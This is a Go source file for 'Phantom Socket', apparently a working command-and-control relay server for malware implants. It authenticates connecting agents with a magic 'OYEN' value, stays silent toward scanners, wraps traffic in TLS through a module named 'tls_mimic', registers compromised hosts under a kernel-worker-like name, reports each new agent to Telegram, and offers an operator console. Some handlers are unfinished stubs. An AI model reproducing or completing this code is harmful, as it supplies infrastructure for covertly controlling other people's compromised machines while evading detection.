// Project: Phantom Socket v1.0.1-stable
// Module: C2 Component
// Description: C2 Infrastructure component (Gacor Edition).

package main

import (
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/soket-io/gs-oyen-r/internal/config"
	"github.com/soket-io/gs-oyen-r/internal/peer"
	"github.com/soket-io/gs-oyen-r/internal/telegram"
	"github.com/soket-io/gs-oyen-r/internal/tls_mimic"
)

var (
	logger         *log.Logger
	activePeer     net.Conn
	activePeerID   string
	peerMutex      sync.Mutex
	consoleMode    bool
	promptMutex    sync.Mutex
	relayTLSConfig *tls.Config
)

type crlfWriter struct {
	writer io.Writer
}

func (w *crlfWriter) Write(p []byte) (n int, err error) {
	promptMutex.Lock()
	defer promptMutex.Unlock()

	// 1. Clear current line (the prompt) to prevent log bleeding into input
	if consoleMode {
		fmt.Print("\r\033[K")
	}

	// 2. Format and write the log message with CRLF for compatibility
	buf := make([]byte, 0, len(p)*2)
	for i := 0; i < len(p); i++ {
		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
			buf = append(buf, '\r', '\n')
		} else {
			buf = append(buf, p[i])
		}
	}

	n, err = w.writer.Write(buf)

	// 3. Asynchronous Prompt Redraw
	if consoleMode {
		redrawPrompt()
	}

	return n, err
}

func redrawPrompt() {
	prompt := "phantom> "
	peerMutex.Lock()
	currentPeerID := activePeerID
	peerMutex.Unlock()

	if currentPeerID != "" {
		shortID := currentPeerID
		if len(shortID) > 13 {
			shortID = shortID[:13]
		}
		prompt = fmt.Sprintf("phantom(%s)> ", shortID)
	}
	fmt.Print(prompt)
}

func main() {
	cfg := config.Load()
	flag.StringVar(&cfg.ListenAddr, "listen", ":8443", "Relay server listen address")
	flag.Parse()

	logger = log.New(&crlfWriter{writer: os.Stderr}, "", log.LstdFlags)

	logger.Println("Phantom Socket v1.0.1-stable Relay Server Starting...")
	logger.Println("Building with Go 1.22+ for high-performance concurrency")

	cert, err := tls_mimic.GenerateSelfSignedCert()
	if err != nil {
		logger.Fatalf("Failed to generate certificate: %v", err)
	}

	tlsConfig, err := tls_mimic.CreateRelayTLSConfig(cert)
	if err != nil {
		logger.Fatalf("Failed to create TLS config: %v", err)
	}
	relayTLSConfig = tlsConfig

	listener, err := net.Listen("tcp", cfg.ListenAddr)
	if err != nil {
		logger.Fatalf("Failed to start listener: %v", err)
	}
	defer listener.Close()

	logger.Printf("Relay server listening on %s (Hybrid PSK+TLS mode)", cfg.ListenAddr)

	registry := peer.NewRegistry()

	// Signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Print("\r\033[K")
		logger.Println("Shutting down relay server...")
		registry.Cleanup()
		os.Exit(0)
	}()

	go startInteractiveConsole(registry, cfg)

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleConnection(conn, registry, cfg)
	}
}

func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
	defer func() {
		if r := recover(); r != nil {
			// Silent recovery
			conn.Close()
		}
	}()

	// Pre-Auth Pre-Logging Guard: Silence for scanners
	pskBuf := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	if _, err := io.ReadFull(conn, pskBuf); err != nil {
		conn.Close()
		return
	}

	// Validation Strictness: Big-Endian 0x4F59454E ("OYEN")
	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E {
		conn.Close()
		return
	}

	remoteAddr := conn.RemoteAddr().String()

	// Upgrade to TLS after PSK validation
	tlsConn := tls.Server(conn, relayTLSConfig)
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return
	}
	conn = tlsConn

	peerID := registry.Register(conn)
	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
	logger.Printf("[+] Agent Online [kworker/u4:0] (ID: %s)", peerID)

	telegram.SendAlert(telegram.AlertData{
		Type:          "v1.0.1-stable ONLINE",
		Hostname:      "N/A",
		User:          "N/A",
		IP:            remoteAddr,
		StealthPath:   "N/A",
		ActionDetails: fmt.Sprintf("Agent %s is now online and registered.", peerID),
		PID:           0,
		Arch:          "N/A",
	})

	handlePeer(conn, peerID, registry)
}

func handlePeer(conn net.Conn, peerID string, registry *peer.Registry) {
	defer registry.Unregister(peerID)
	
	buf := make([]byte, 4096)
	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				logger.Printf("Connection error with agent %s: %v", peerID, err)
			}
			return
		}
		
		// Handle agent messages
		_ = n
	}
}

func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
	consoleMode = true
	fmt.Println("Phantom Socket v1.0.1-stable Relay Console")
	fmt.Println("Type 'help' for available commands.")
	fmt.Println()
	redrawPrompt()

	var input string
	for {
		_, err := fmt.Scanln(&input)
		if err != nil {
			if err != io.EOF {
				redrawPrompt()
			}
			continue
		}

		switch input {
		case "help":
			fmt.Println("Commands: list, interact <id>, exit")
		case "list":
			peers := registry.ListPeers()
			fmt.Printf("Connected Agents (%d):\n", len(peers))
			for _, p := range peers {
				fmt.Printf(" - %s\n", p)
			}
		case "exit":
			os.Exit(0)
		default:
			fmt.Printf("Unknown command: %s\n", input)
		}
		redrawPrompt()
	}
}
